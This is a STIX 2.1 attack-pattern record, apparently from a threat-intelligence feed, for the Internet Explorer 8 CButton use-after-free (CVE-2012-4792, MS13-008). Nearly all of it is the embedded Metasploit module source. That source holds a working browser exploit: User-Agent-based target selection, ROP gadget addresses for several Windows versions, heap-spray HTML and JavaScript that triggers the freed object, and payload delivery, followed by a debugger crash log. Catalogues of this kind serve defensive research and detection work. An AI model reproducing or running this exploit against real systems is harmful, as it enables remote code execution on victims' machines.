{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--58b95bd4-fb41-4917-abce-72e67c05e5b2",
    "created": "2024-08-14T16:43:30.907259Z",
    "modified": "2024-08-14T16:43:30.907263Z",
    "name": "\"MS13-008 Microsoft Internet Explorer CButton Object Use-After-Free Vulnerability\"",
    "description": " This module exploits a vulnerability found in Microsoft Internet Explorer. A use-after-free condition occurs when a CButton object is freed, but a reference is kept and used again during a page reload, an invalid memory that's controllable is used, and allows arbitrary code execution under the context of the user.  Please note: This vulnerability has been exploited in the wild targeting mainly China/Taiwan/and US-based computers.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ie_cbutton_uaf.rb",
            "external_id": "ie_cbutton_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4792"
        },
        {
            "source_name": "reference",
            "url": "http://blog.fireeye.com/research/2012/12/council-foreign-relations-water-hole-attack-details.html"
        },
        {
            "source_name": "reference",
            "url": "http://eromang.zataz.com/2012/12/29/attack-and-ie-0day-informations-used-against-council-on-foreign-relations/"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/security/advisory/2794220"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/srd/archive/2012/12/29/new-vulnerability-affecting-internet-explorer-8-users.aspx"
        },
        {
            "source_name": "reference",
            "url": "http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/12/29/microsoft-internet-explorer-0-day-marks-the-end-of-2012"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"8.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => GoodRanking\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-008 Microsoft Internet Explorer CButton Object Use-After-Free Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Microsoft Internet Explorer. A\n        use-after-free condition occurs when a CButton object is freed, but a reference\n        is kept and used again during a page reload, an invalid memory that's controllable\n        is used, and allows arbitrary code execution under the context of the user.\n\n          Please note: This vulnerability has been exploited in the wild targeting\n        mainly China/Taiwan/and US-based computers.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'eromang',\n          'mahmud ab rahman',\n          'juan vazquez',      #Metasploit\n          'sinn3r',            #Metasploit\n          'Peter Vreugdenhil'  #New trigger & new exploit technique\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4792' ],\n          [ 'OSVDB', '88774' ],\n          [ 'US-CERT-VU', '154201' ],\n          [ 'BID', '57070' ],\n          [ 'MSB', 'MS13-008' ],\n          [ 'URL', 'http://blog.fireeye.com/research/2012/12/council-foreign-relations-water-hole-attack-details.html'],\n          [ 'URL', 'http://eromang.zataz.com/2012/12/29/attack-and-ie-0day-informations-used-against-council-on-foreign-relations/'],\n          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2794220' ],\n          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2012/12/29/new-vulnerability-affecting-internet-explorer-8-users.aspx' ],\n          [ 'URL', 'http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/12/29/microsoft-internet-explorer-0-day-marks-the-end-of-2012' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x00\",\n          'Space'          => 1024,\n          'DisableNops'    => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 8 on Windows XP SP3',       { 'Rop' => :msvcrt } ],\n          [ 'IE 8 on Windows Vista',        { 'Rop' => :jre    } ],\n          [ 'IE 8 on Windows Server 2003',  { 'Rop' => :msvcrt } ],\n          [ 'IE 8 on Windows 7',            { 'Rop' => :jre    } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-12-27',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '5.2'\n      os_name = 'Windows Server 2003'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    else\n      # OS not supported\n      return nil\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\")[0].to_i\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # Make post code execution more stable\n    code << rand_text_alpha(12000)\n\n    msvcrt_align = \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n    java_align   = \"\\x81\\xEC\\xF0\\xD8\\xFF\\xFF\" # sub esp, -10000\n\n    rop_payload = ''\n\n    case t['Rop']\n    when :msvcrt\n      case t.name\n      when 'IE 8 on Windows XP SP3'\n        rop_payload = generate_rop_payload('msvcrt', msvcrt_align + code, {'target'=>'xp'})\n      when 'IE 8 on Windows Server 2003'\n        rop_payload = generate_rop_payload('msvcrt', msvcrt_align + code, {'target'=>'2003'})\n      end\n    else\n      rop_payload = generate_rop_payload('java', java_align + code)\n    end\n\n    rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n\n    case my_target['Rop']\n    when :msvcrt\n      case my_target.name\n      when 'IE 8 on Windows XP SP3'\n        align_esp = Rex::Text.to_unescape([0x77c4d801].pack(\"V*\")) # ADD ESP, 2C; RET\n        xchg_esp  = Rex::Text.to_unescape([0x77c15ed5].pack(\"V*\")) # XCHG EAX, ESP, RET\n      when 'IE 8 on Windows Server 2003'\n        align_esp = Rex::Text.to_unescape([0x77bde7f6].pack(\"V*\"))\n        xchg_esp  = Rex::Text.to_unescape([0x77bcba5e].pack(\"V*\"))\n      end\n    else\n      align_esp = Rex::Text.to_unescape([0x7C3445F8].pack(\"V*\"))\n      xchg_esp  = Rex::Text.to_unescape([0x7C348B05].pack(\"V*\"))\n    end\n\n    padding    = Rex::Text.to_unescape(Rex::Text.rand_text_alpha(4))\n    js_payload = Rex::Text.to_unescape(get_payload(my_target, cli))\n\n    html = %Q|<!doctype html>\n    <HTML XMLNS:t =\"urn:schemas-microsoft-com:time\">\n    <head>\n    <meta>\n      <?IMPORT namespace=\"t\" implementation=\"#default#time2\">\n    </meta>\n\n    <script>\n    #{js_mstime_malloc}\n\n\n    function helloWorld() {\n      e_form = document.getElementById(\"formelm\");\n      e_div = document.getElementById(\"divelm\");\n\n      for(i =0; i < 20; i++) {\n        document.createElement('button');\n      }\n      e_div.appendChild(document.createElement('button'));\n      e_div.firstChild.applyElement(e_form);\n\n      e_div.innerHTML = \"\";\n      e_div.appendChild(document.createElement('body'));\n\n      CollectGarbage();\n\n      p = unescape(\"#{padding}\");\n      for (i=0; i < 3; i++) {\n        p += unescape(\"#{padding}\");\n      }\n      p += unescape(\"#{js_payload}\");\n\n      fo = unescape(\"#{align_esp}\");\n      for (i=0; i < 55; i++) {\n        if (i == 54) { fo += unescape(\"#{xchg_esp}\"); }\n        else         { fo += unescape(\"#{align_esp}\"); }\n      }\n\n      fo += p;\n\n      mstime_malloc({shellcode:fo, heapBlockSize:0x58, objId:\"myanim\"});\n    }\n    </script>\n    </head>\n\n    <body onload=\"eval(helloWorld())\">\n    <t:ANIMATECOLOR id=\"myanim\"/>\n    <div id=\"divelm\"></div>\n    <form id=\"formelm\">\n    </form>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n\n\n=begin\n(87c.f40): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=12120d0c ebx=0023c218 ecx=00000052 edx=00000000 esi=00000000 edi=0301e400\neip=637848c3 esp=020bf834 ebp=020bf8a4 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nmshtml!CMarkup::OnLoadStatusDone+0x504:\n637848c3 ff90dc000000    call    dword ptr <Unloaded_Ed20.dll>+0xdb (000000dc)[eax] ds:0023:12120de8=????????\n0:008> k\nChildEBP RetAddr\n020bf8a4 635c378b mshtml!CMarkup::OnLoadStatusDone+0x504\n020bf8c4 635c3e16 mshtml!CMarkup::OnLoadStatus+0x47\n020bfd10 636553f8 mshtml!CProgSink::DoUpdate+0x52f\n020bfd24 6364de62 mshtml!CProgSink::OnMethodCall+0x12\n020bfd58 6363c3c5 mshtml!GlobalWndOnMethodCall+0xfb\n020bfd78 7e418734 mshtml!GlobalWndProc+0x183\n020bfda4 7e418816 USER32!InternalCallWinProc+0x28\n020bfe0c 7e4189cd USER32!UserCallWinProcCheckWow+0x150\n020bfe6c 7e418a10 USER32!DispatchMessageWorker+0x306\n020bfe7c 01252ec9 USER32!DispatchMessageW+0xf\n020bfeec 011f48bf IEFRAME!CTabWindow::_TabWindowThreadProc+0x461\n020bffa4 5de05a60 IEFRAME!LCIETab_ThreadProc+0x2c1\n020bffb4 7c80b713 iertutil!CIsoScope::RegisterThread+0xab\n020bffec 00000000 kernel32!BaseThreadStart+0x37\n\n0:008> r\neax=0c0c0c0c ebx=0023c1d0 ecx=00000052 edx=00000000 esi=00000000 edi=033e9120\neip=637848c3 esp=020bf834 ebp=020bf8a4 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nmshtml!CMarkup::OnLoadStatusDone+0x504:\n637848c3 ff90dc000000    call    dword ptr [eax+0DCh] ds:0023:0c0c0ce8=????????\n=end\n",
    "x_mitre_disclosure_date": "2012-12-27",
    "x_mitre_platforms": [
        "win'"
    ]
}